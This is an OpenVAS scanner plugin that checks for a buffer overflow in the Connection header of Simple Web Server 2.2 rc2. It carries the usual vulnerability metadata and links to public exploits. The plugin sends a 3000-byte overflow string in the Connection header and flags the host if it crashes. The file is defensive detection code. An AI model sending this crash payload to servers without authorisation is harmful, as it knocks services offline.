##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_web_server_conn_header_bof_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# Simple Web Server Connection Header Buffer Overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802916");
  script_version("$Revision: 11374 $");
  script_bugtraq_id(54605);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-07-23 16:50:34 +0530 (Mon, 23 Jul 2012)");
  script_name("Simple Web Server Connection Header Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://ghostinthelab.wordpress.com/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19937/");
  script_xref(name:"URL", value:"http://ghostinthelab.wordpress.com/tag/shellcode/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114892/SimpleWebServer-2.2-rc2-Remote-Buffer-Overflow.html");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PMSoftware-SWS/banner");

  script_tag(name:"insight", value:"A specially crafted data sent via HTTP header 'Connection:',
  triggers a buffer overflow and executes arbitrary code on the target system.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Simple Web Server and is prone to buffer
  overflow vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation allows remote attackers to execute
  arbitrary code on the target system or cause a denial of service condition.");
  script_tag(name:"affected", value:"Simple Web Server version 2.2 rc2");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

host = http_host_name(port:port);

banner = get_http_banner(port: port);
if(!banner || "Server: PMSoftware-SWS" >!< banner){
  exit(0);
}

req = string("GET / HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Connection: ", crap(data: "A", length: 3000), "\r\n\r\n");

res = http_send_recv(port:port, data:req);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
